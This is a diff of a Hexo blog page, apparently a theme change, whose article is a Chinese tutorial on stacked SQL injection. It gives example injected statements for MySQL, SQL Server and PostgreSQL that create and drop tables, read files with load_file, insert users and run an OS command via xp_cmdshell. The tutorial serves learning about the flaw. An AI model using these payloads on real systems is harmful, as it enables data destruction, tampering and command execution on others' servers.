@@ -1,18 +1,31 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="堆叠注入 stacked  injection堆叠注入原理 mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入 而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="堆叠注入 stacked  injection堆叠注入原理 mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入 而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="堆叠注入 stacked  injection">
 <meta property="og:url" content="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="堆叠注入 stacked  injection堆叠注入原理 mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入 而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/.com//1049983-20180929015645345-261813262-20250418142338-b14gqor.gif">
 <meta property="og:image" content="http://example.com/.com//1049983-20180929015645671-1445708848-20250418145452-5bj63io.gif">
 <meta property="og:image" content="http://example.com/.com//1049983-20180929015645943-40278598-20250418145455-12lvk48.gif">
@@ -34,80 +47,272 @@
 <meta property="og:image" content="http://example.com/.com//1049983-20180929015650516-1080177008-20250418145618-y3ccfz0.gif">
 <meta property="og:image" content="http://example.com/.com//1049983-20180929015650885-769688906-20250418145621-rkshp8y.gif">
 <meta property="og:image" content="http://example.com/.com//1049983-20180929015651359-2117725775-20250418145626-lnlx1c8.gif">
-<meta property="article:published_time" content="2025-05-20T00:55:56.000Z">
-<meta property="article:modified_time" content="2025-05-20T00:55:56.000Z">
+<meta property="article:published_time" content="2025-05-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-21T13:22:45.935Z">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
+<meta property="article:tag" content="堆叠注入 stacked  injection">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/.com//1049983-20180929015645345-261813262-20250418142338-b14gqor.gif">
   
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
   
-    <link rel="shortcut icon" href="/favicon.png">
+  <title>堆叠注入 stacked  injection - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/image/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
-<link rel="stylesheet" href="/css/style.css">
+
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
 <meta name="generator" content="Hexo 7.3.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
 
-      <div class="outer">
-        <section id="main"><article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>我的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="堆叠注入 stacked  injection"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-20 00:00" pubdate>
+          星期二, 五月 20日 2025, 12:00 凌晨
+        </time>
+      </span>
     
   </div>
-  <div class="article-inner">
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          17 分钟
+        
+      </span>
+    
+
     
     
-    <div class="e-content article-entry" itemprop="articleBody">
+  </div>
+
+
+        
+      </div>
+
       
-        <h1 id="堆叠注入-stacked-injection"><a href="#堆叠注入-stacked-injection" class="headerlink" title="堆叠注入 stacked  injection"></a>堆叠注入 stacked  injection</h1><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote>
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">堆叠注入 stacked  injection</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="堆叠注入-stacked-injection"><a href="#堆叠注入-stacked-injection" class="headerlink" title="堆叠注入 stacked  injection"></a>堆叠注入 stacked  injection</h1><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote>
 <p>mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入</p>
 <p>而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句&#x3D;&#x3D;类型是有限&#x3D;&#x3D;的，可以用来执行查询语句，而堆叠注入可以&#x3D;&#x3D;执行&#x3D;&#x3D;的是&#x3D;&#x3D;任意的语句&#x3D;&#x3D;。</p>
 <p><strong>eg</strong></p>
@@ -118,345 +323,575 @@
 <p>‍</p>
 <h1 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h1><blockquote>
 <p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
-<p><img src="/.com//1049983-20180929015645345-261813262-20250418142338-b14gqor.gif" alt="1049983-20180929015645345-261813262"></p>
+<p><img src="/.com//1049983-20180929015645345-261813262-20250418142338-b14gqor.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015645345-261813262"></p>
 <p>此图是从<strong>原文</strong>中<strong>截取</strong>过来的，因为我个人的<strong>测试环境</strong>是<strong>php+mysql</strong>，是<strong>可以执行</strong>的，此处对于<strong>mysql&#x2F;php存在质疑</strong>。但个人估计原文作者可能与我的<strong>版本的不同</strong>的原因。虽然我们前面提到了堆叠查询可以<strong>执行任意的sql</strong>语句，但是这种注入方式<strong>并不是</strong>十分的<strong>完美</strong>的。在我们的web系统中，因为代码通常<strong>只返回一个查询结果</strong>，因此，堆叠注入<strong>第二个</strong>语句<strong>产生错误</strong>或者<strong>结果</strong>只能被<strong>忽略</strong>，我们在<strong>前端</strong>界面是<strong>无法看到</strong>返回<strong>结果</strong>的。因此，在读取数据时，我们建议使用<strong>union（联合）</strong> 注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
 </blockquote>
 <p>‍</p>
 <h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>（1）新建一表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;create table <span class="hljs-built_in">test</span> like <span class="hljs-built_in">users</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015645671-1445708848-20250418145452-5bj63io.gif" alt="1049983-20180929015645671-1445708848"></p>
+<p><img src="/.com//1049983-20180929015645671-1445708848-20250418145452-5bj63io.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015645671-1445708848"></p>
 <p>执行成功，我们再去看一下是否新建成功表。</p>
-<p><img src="/.com//1049983-20180929015645943-40278598-20250418145455-12lvk48.gif" alt="1049983-20180929015645943-40278598"></p>
+<p><img src="/.com//1049983-20180929015645943-40278598-20250418145455-12lvk48.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015645943-40278598"></p>
 <p>（2）删除上面新建的test表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;drop table <span class="hljs-built_in">test</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015646198-1529755622-20250418145501-moc8u2z.gif" alt="1049983-20180929015646198-1529755622"></p>
-<p><img src="/.com//1049983-20180929015646449-976012187-20250418145504-r5c54as.gif" alt="1049983-20180929015646449-976012187"></p>
+<p><img src="/.com//1049983-20180929015646198-1529755622-20250418145501-moc8u2z.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015646198-1529755622"></p>
+<p><img src="/.com//1049983-20180929015646449-976012187-20250418145504-r5c54as.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015646449-976012187"></p>
 <p>（3）查询数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select 1,2,3;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;<span class="hljs-keyword">select</span> 1,2,3;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015646651-307633841-20250418145508-luvcepa.gif" alt="1049983-20180929015646651-307633841"></p>
+<p><img src="/.com//1049983-20180929015646651-307633841-20250418145508-luvcepa.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015646651-307633841"></p>
 <p>（4）加载文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select load_file(&#x27;c:/tmpupbbn.php&#x27;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;c:/tmpupbbn.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015646928-818625825-20250418145512-1v55m2l.gif" alt="1049983-20180929015646928-818625825"></p>
+<p><img src="/.com//1049983-20180929015646928-818625825-20250418145512-1v55m2l.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015646928-818625825"></p>
 <p>(4) 修改数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;insert into users(id,username,password) values (&#x27;100&#x27;,&#x27;new&#x27;,&#x27;new&#x27;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;100&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015647123-855312514-20250418145524-9w3iwfi.gif" alt="1049983-20180929015647123-855312514"></p>
-<p><img src="/.com//1049983-20180929015647385-1686789783-20250418145527-uwrbwtv.gif" alt="1049983-20180929015647385-1686789783"></p>
+<p><img src="/.com//1049983-20180929015647123-855312514-20250418145524-9w3iwfi.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015647123-855312514"></p>
+<p><img src="/.com//1049983-20180929015647385-1686789783-20250418145527-uwrbwtv.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015647385-1686789783"></p>
 <h2 id="2-Sql-server"><a href="#2-Sql-server" class="headerlink" title="2. Sql server"></a>2. Sql server</h2><p>(1)增加数据表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;create table sc3(ss CHAR(8));</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sc3(ss <span class="hljs-type">CHAR</span>(<span class="hljs-number">8</span>));<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015647694-982429887-20250418145531-s83ngpd.gif" alt="1049983-20180929015647694-982429887"></p>
+<p><img src="/.com//1049983-20180929015647694-982429887-20250418145531-s83ngpd.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015647694-982429887"></p>
 <p>(2) 删除数据表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;drop table sc3;</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> sc3;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015648051-1234311462-20250418145535-qf3clju.gif" alt="1049983-20180929015648051-1234311462"></p>
+<p><img src="/.com//1049983-20180929015648051-1234311462-20250418145535-qf3clju.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015648051-1234311462"></p>
 <p>(4)查询数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3;select * from test;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;select * from test;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015648347-1625714699-20250418145539-j8nkra8.gif" alt="1049983-20180929015648347-1625714699"></p>
+<p><img src="/.com//1049983-20180929015648347-1625714699-20250418145539-j8nkra8.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015648347-1625714699"></p>
 <p>(5)修改数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;update test set name=&#x27;test&#x27; where id=3;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">test</span>;update <span class="hljs-built_in">test</span> <span class="hljs-built_in">set</span> name=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=3;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015648636-932399825-20250418145545-ple8xai.gif" alt="1049983-20180929015648636-932399825"></p>
-<p><img src="/.com//1049983-20180929015648911-1380875302-20250418145559-oh45cnc.gif" alt="1049983-20180929015648911-1380875302"></p>
+<p><img src="/.com//1049983-20180929015648636-932399825-20250418145545-ple8xai.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015648636-932399825"></p>
+<p><img src="/.com//1049983-20180929015648911-1380875302-20250418145559-oh45cnc.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015648911-1380875302"></p>
 <p>(5)sqlserver中最为重要的存储过程的执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1;exec master..xp_cmdshell &#x27;ipconfig&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;<span class="hljs-built_in">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;ipconfig&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015649295-413295225-20250418145603-v0relca.gif" alt="1049983-20180929015649295-413295225"></p>
+<p><img src="/.com//1049983-20180929015649295-413295225-20250418145603-v0relca.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015649295-413295225"></p>
 <h2 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3.Oracle"></a>3.Oracle</h2><blockquote>
 <p>上面的介绍中我们已经提及，&#x3D;&#x3D;oracle不能使用堆叠注入&#x3D;&#x3D;，可以从图中看到，当有&#x3D;&#x3D;两条语句在同一行时&#x3D;&#x3D;，&#x3D;&#x3D;直接报错,无效字符&#x3D;&#x3D;。后面的就不往下继续尝试了。</p>
 </blockquote>
-<p><img src="/.com//1049983-20180929015649555-1984392073-20250418145608-d8axt98.gif" alt="1049983-20180929015649555-1984392073"></p>
+<p><img src="/.com//1049983-20180929015649555-1984392073-20250418145608-d8axt98.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015649555-1984392073"></p>
 <h2 id="4-Postgresql"><a href="#4-Postgresql" class="headerlink" title="4.Postgresql"></a>4.Postgresql</h2><p>(1)新建一个表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;create table user_data(id DATE);</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> user_data(id <span class="hljs-type">DATE</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015649893-911848487-20250418145612-l3ok6px.gif" alt="1049983-20180929015649893-911848487"></p>
-<p><img src="/.com//1049983-20180929015650150-1255028615-20250418145614-5fdv2lo.gif" alt="1049983-20180929015650150-1255028615"></p>
+<p><img src="/.com//1049983-20180929015649893-911848487-20250418145612-l3ok6px.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015649893-911848487"></p>
+<p><img src="/.com//1049983-20180929015650150-1255028615-20250418145614-5fdv2lo.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015650150-1255028615"></p>
 <p>可以看到user_data表已经建好。</p>
 <p>(2)删除上面新建的user_data表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;delete from user_data;</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> user_data;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015650516-1080177008-20250418145618-y3ccfz0.gif" alt="1049983-20180929015650516-1080177008"></p>
+<p><img src="/.com//1049983-20180929015650516-1080177008-20250418145618-y3ccfz0.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015650516-1080177008"></p>
 <p>(3)查询数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;select 1,2,3;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from user_test;select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015650885-769688906-20250418145621-rkshp8y.gif" alt="1049983-20180929015650885-769688906"></p>
+<p><img src="/.com//1049983-20180929015650885-769688906-20250418145621-rkshp8y.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015650885-769688906"></p>
 <p>(4) 修改数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;update user_test set name=&#x27;modify&#x27; where name=&#x27;张三&#x27;;</span><br></pre></td></tr></table></figure>
